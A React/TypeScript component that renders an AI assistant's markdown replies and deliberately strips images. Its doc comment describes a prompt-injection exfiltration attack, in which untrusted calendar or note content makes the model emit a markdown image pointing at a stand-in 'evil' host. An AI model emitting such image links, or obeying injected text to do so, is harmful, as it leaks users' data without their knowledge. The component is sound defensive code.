import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";

/**
 * Renders assistant markdown: GFM tables, task lists, autolinks, strikethrough,
 * code, blockquotes, etc. react-markdown maps to React elements (no raw-HTML
 * injection, so no XSS). Links open in a new tab; wide tables scroll on their
 * own instead of stretching the chat column.
 *
 * Images are dropped deliberately. An assistant reply is attacker-influenced —
 * its context includes note text and untrusted calendar-feed content — and a
 * markdown image loads with no user interaction, so `![](https://evil/?d=…)`
 * would be a zero-click channel for smuggling out whatever the model just read.
 * Assistant replies have no legitimate need to embed remote images.
 */
export function Markdown({ children }: { children: string }) {
  return (
    <div className="md">
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        disallowedElements={["img"]}
        unwrapDisallowed
        components={{
          a: ({ href, children }) => (
            <a href={href} target="_blank" rel="noreferrer noopener">
              {children}
            </a>
          ),
          table: ({ children }) => (
            <div className="md-table-wrap">
              <table>{children}</table>
            </div>
          ),
        }}
      >
        {children}
      </ReactMarkdown>
    </div>
  );
}
